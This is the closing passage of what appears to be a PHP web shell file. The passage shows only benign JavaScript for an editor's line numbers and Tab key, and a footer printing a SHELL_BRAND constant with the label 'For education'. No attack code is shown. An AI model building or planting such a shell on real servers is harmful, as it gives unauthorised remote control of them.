                            lineNumbersGutter.appendChild(lineNumberElement);
                        }
                        lineNumbersGutter.scrollTop = editorTextarea.scrollTop;
                    }

                    editorTextarea.addEventListener('input', updateLineNumbers);
                    editorTextarea.addEventListener('scroll', () => {
                        lineNumbersGutter.scrollTop = editorTextarea.scrollTop;
                    });
                    editorTextarea.addEventListener('keydown', function(e) {
                        if (e.key === 'Tab') {
                            e.preventDefault();
                            const start = this.selectionStart;
                            const end = this.selectionEnd;
                            this.value = this.value.substring(0, start) + "\\t" + this.value.substring(end);
                            this.selectionStart = this.selectionEnd = start + 1;
                            updateLineNumbers();
                        }
                    });
                    updateLineNumbers();
                }
            });
            </script>
        <?php endif; ?>
        <p class="footer-text">
            <?php echo htmlspecialchars(SHELL_BRAND); ?> © <?php echo date("Y"); ?> FebryEnsz. For education.
        </p>
    </div>
</body>
</html>
